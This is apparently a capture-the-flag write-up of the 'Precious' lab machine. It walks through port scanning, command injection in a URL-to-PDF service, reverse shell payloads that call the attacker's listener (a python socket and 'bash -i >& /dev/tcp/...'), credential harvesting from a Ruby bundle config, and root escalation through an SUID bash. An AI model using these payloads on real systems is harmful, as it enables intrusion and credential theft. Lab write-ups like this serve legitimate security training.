# Precious

## Service and Port Enumeration

Let's start with a basic port scan (no ping)
`nmap -sS -Pn 10.10.11.189`

Nmap gives us:
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Run NSE scripts to find domain name?
```
└─$ sudo nmap -sV -sC -Pn 10.10.11.189
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-08 22:49 EST
Nmap scan report for 10.10.11.189
Host is up (0.0055s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The IP resolves to `http://precious.htb/`

We add this to our `/etc/hosts` file, and plug the hostname into the browser

---

## The webpage

The main functionality of the page is to submit data entered into a text field - sent as an HTTP POST request

Intercepting the request, we see:
```
POST / HTTP/1.1
Host: precious.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Origin: http://precious.htb
DNT: 1
Connection: keep-alive
Referer: http://precious.htb/
Upgrade-Insecure-Requests: 1

url=
```

So, we supply a url and it will print a pdf with its contents
- This seems like an injection type of vuln
- I could have it, for instance, print the contents of my current directory
    - All i'd need to do is set up a network listener

So let's prop up a netcat listener: `nc -lvnp 80`
```
listening on [any] 80 ...
```

Then we inject our IP address into the text field
```
http://10.10.14.37
```

We get a PDF in a new tab with the contents of our directory!
- So, we can connect to our url, and add a `name` query string 
    - We can delimit a user input `fragment` with `#`
    - We can encapsulate a user input `fragment` with `{<user_input>}`
    - We surround our 'payload' string with `''`'s, and the command itself with tick-marks 
    - Full info on query string syntax is documented in [RFC3986](https://www.rfc-editor.org/rfc/rfc3986)

### Demonstration:

When we try
```
'http://10.10.14.37:80/?name=#{`echo hello`}'
```

We get the following:
```
Directory listing for /?name=#{`echo hello`}
```

This is not the output we were hoping for, let's wrap it in single quotes

When we try '`echo hello`', we get a URL-encoded string:
```
10.10.11.189 - - [17/Dec/2022 11:57:35] "GET /?name=%23%7B'%60echo%20hello%60'%7D HTTP/1.1" 200 -
```
And
```
Directory listing for /?name=#{'`echo hello`'}
```

Also not what we were looking for!
- If we purposely inject a url-encoded character (like a space - `%20`)
    - Will that trick the parser into running the input?

Running
```
"http://10.10.14.37:80/?name=#{'%20`echo hello`'}"
```

We get:
```
10.10.11.189 - - [17/Dec/2022 12:29:01] "GET /?name= HTTP/1.1" 200 -
```
And
```
Directory listing for /?name=
```

So the instruction looks as though it were processed, but we don't know for sure

Let's try a command that we can more easily verify:
``` 
http://10.10.14.37:80/?name=#{'%20`sleep 5`'}
```

We see the browser sleep for 5 seconds and then post the HTTP response
- So we know that our commands in this format are working 
- Let's try to get a reverse shell

When running this as input:
```
http://10.10.14.37:80/?name=#{'%20`python3 -c 'import pty,socket;s=socket.socket();s.connect(("10.10.14.37", 80));pty.spawn("/bin/bash")'`'}
```

Our session hangs - which is also a good sign! But we're not seeing a shell spawn:
```
10.10.11.189 - - [17/Dec/2022 13:48:30] "GET /?name= HTTP/1.1" 200 -
```

How about the bash equivalent?
```
http://10.10.14.37:80/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.37/80 0>&1"`'}
```

> The above bash code wraps a bash command in double quotes
> `bash -i` gives us an interactive session
> `>%` operator is used to duplicate output file descriptors
> output is redirected to the TCP socket that will be opened up 
> the socket will have the format `/dev/<proto>/<ip>/<port>`
> `0>&1`: continue to listen for stdin, and redirect to stdout [critical]

Basically, we:
- spawn an interactive shell
- redirect the shell output to wherever our network listener is
- redirect our input to wherever shell output is being directed 

And we get a shell!
```
connect to [10.10.14.37] from (UNKNOWN) [10.10.11.189] 36034
bash: cannot set terminal process group (680): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ 
```

If we navigate to `/home/ruby/.bundle`, and `cat config`, we get:
```
bash-5.1$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
bash-5.1$ 
```

Looks like we have henry's creds!
Let's try to `ssh` in with them
```
└─$ ssh henry@10.10.11.189
henry@10.10.11.189's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Dec 17 21:59:55 2022 from 10.10.14.7
-bash-5.1$ 
```

And we're logged in as henry!
```
$ cat user.txt
e9554ffbd13a4bb816158e664cd2a763
```

And we have the flag

---

## PrivEsc

Checking our permissions, we see we have:
```
-bash-5.1$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

So it looks like `/opt/update_dependencies.rb` loads a `dependencies.yml` file:
```
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end
```

If we run `sudo /usr/bin/ruby /opt/update_dependencies.yml`, we get:
```
1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
```

When looking at our dependencies.yml, we see a reference for `u+s /bin/bash`, same with the dependiencies.yaml

So there's a change in permissions for `/bin/bash`. Our current permissions with `/bin/bash` are:
```
-bash-5.1$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
-bash-5.1$ 
```

We see some `suid` bit enablement in the above permissions
- This suggests that we could try toggling `/bin/bash -p`

We can run `/bin/bash -p` to run `bash` as the effective user (meaning that it can be enabled when `ruid` and `euid` do not match).
```
-bash-5.1#
```

And we have root, and can get the flag
